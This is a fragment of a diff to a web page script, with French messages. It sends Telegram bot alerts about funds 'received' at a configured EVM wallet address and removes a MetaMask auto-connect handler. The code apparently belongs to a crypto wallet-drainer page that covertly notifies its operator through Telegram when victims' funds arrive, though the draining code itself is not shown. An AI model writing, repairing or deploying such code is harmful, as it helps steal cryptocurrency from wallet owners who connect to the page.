+📍 Reçu sur: ${CONFIG.EVM_DESTINATION.substring(0, 6)}...${CONFIG.EVM_DESTINATION.slice(-4)}
 ⏰ Heure: ${new Date().toLocaleTimeString()}
-━━━━━━━━━━━━━━━`;
+━━━━━━━━━━━━━━━━━━━━━`;
     
-    fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: CONFIG.TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'HTML'
-        })
-    });
-}
-
-// AUTO-CONNECT SI WALLET DÉJÀ CONNECTÉ
-window.addEventListener('load', async () => {
-    if (window.ethereum && window.ethereum.selectedAddress) {
-        setTimeout(() => connectMetaMask(), 1000);
+    try {
+        await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CONFIG.TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+    } catch (e) {
+        console.log('Telegram notification failed');
     }
-});
+}
 </script>
 </body>
 </html>
